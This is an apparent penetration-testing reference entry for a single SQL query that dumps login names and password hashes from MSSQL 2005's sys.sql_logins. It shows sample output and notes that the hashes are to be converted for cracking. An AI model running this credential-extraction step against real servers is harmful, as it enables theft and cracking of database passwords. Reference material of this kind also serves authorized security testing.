---
type: command
executor: sql
data: 'SELECT name, password_hash FROM master.sys.sql_logins'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mssql
  - hash-extraction
verified: true
validated: true
---

# mssql-2005-retrieve-name-password-hash-sql-logins

## Command

```sql
SELECT name, password_hash FROM master.sys.sql_logins
```

## Description

Dumps usernames and binary password hashes from sys.sql_logins in MSSQL 2005. Follow with hex conversion for cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Standard SELECT from system view | No |

## Examples

### Basic Usage

```sql
SELECT name, password_hash FROM master.sys.sql_logins
```

## Expected Output

name    password_hash
sa      0x02010100010000000D000000...

## Related

- [[procedures/MSSQL-Server-Password-Hash-Extraction-and-Cracking]]
